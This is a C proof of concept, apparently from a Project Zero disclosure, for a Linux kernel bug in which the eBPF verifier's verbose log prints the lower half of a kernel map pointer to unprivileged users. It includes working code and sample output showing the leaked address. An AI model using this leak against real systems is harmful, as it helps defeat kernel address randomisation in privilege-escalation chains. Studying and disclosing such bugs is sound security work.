/*
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1251

When the eBPF verifier (kernel/bpf/verifier.c) runs in verbose mode,
it dumps all processed instructions to a user-accessible buffer in
human-readable form using print_bpf_insn(). For instructions with
class BPF_LD and mode BPF_IMM, it prints the raw 32-bit value:

  } else if (class == BPF_LD) {
    if (BPF_MODE(insn->code) == BPF_ABS) {
      [...]
    } else if (BPF_MODE(insn->code) == BPF_IND) {
      [...]
    } else if (BPF_MODE(insn->code) == BPF_IMM) {
      verbose("(%02x) r%d = 0x%x\n",
              insn->code, insn->dst_reg, insn->imm);
    } else {
      [...]
    }
  } else if (class == BPF_JMP) {

This is done in do_check(), after replace_map_fd_with_map_ptr() has
executed. replace_map_fd_with_map_ptr() stores the lower half of a raw
pointer in all instructions with class BPF_LD, mode BPF_IMM and size
BPF_DW (map references).

So when verbose verification is performed on a program with a map
reference, the lower half of the pointer to the map becomes visible to
the user:

$ cat bpf_pointer_leak_poc.c
*/

#define _GNU_SOURCE
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/bpf.h>
#include <err.h>
#include <stdio.h>
#include <stdint.h>

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_DW | BPF_IMM,         \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = (__u32) (IMM) }),                  \
  ((struct bpf_insn) {                          \
    .code  = 0, /* zero is reserved opcode */   \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = ((__u64) (IMM)) >> 32 })
#define BPF_LD_MAP_FD(DST, MAP_FD)              \
  BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
#define BPF_MOV64_IMM(DST, IMM)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_EXIT_INSN()                         \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_EXIT,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = 0 })

#define ARRSIZE(x) (sizeof(x) / sizeof((x)[0]))

int bpf_(int cmd, union bpf_attr *attrs) {
  return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}

int main(void) {
  union bpf_attr create_map_attrs = {
    .map_type = BPF_MAP_TYPE_ARRAY,
    .key_size = 4,
    .value_size = 1,
    .max_entries = 1
  };
  int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
  if (mapfd == -1)
    err(1, "map create");

  struct bpf_insn insns[] = {
    BPF_LD_MAP_FD(BPF_REG_0, mapfd),
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };
  char verifier_log[10000];
  union bpf_attr create_prog_attrs = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = ARRSIZE(insns),
    .insns = (uint64_t)insns,
    .license = (uint64_t)"",
    .log_level = 1,
    .log_size = sizeof(verifier_log),
    .log_buf = (uint64_t)verifier_log
  };
  int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);
  if (progfd == -1)
    err(1, "prog load");

  puts(verifier_log);
}

/*
$ gcc -o bpf_pointer_leak_poc bpf_pointer_leak_poc.c -Wall -std=gnu99 -I~/linux/usr/include
$ ./bpf_pointer_leak_poc
0: (18) r0 = 0xd9da1c80
2: (b7) r0 = 0
3: (95) exit
processed 3 insns

Tested with kernel 4.11.
*/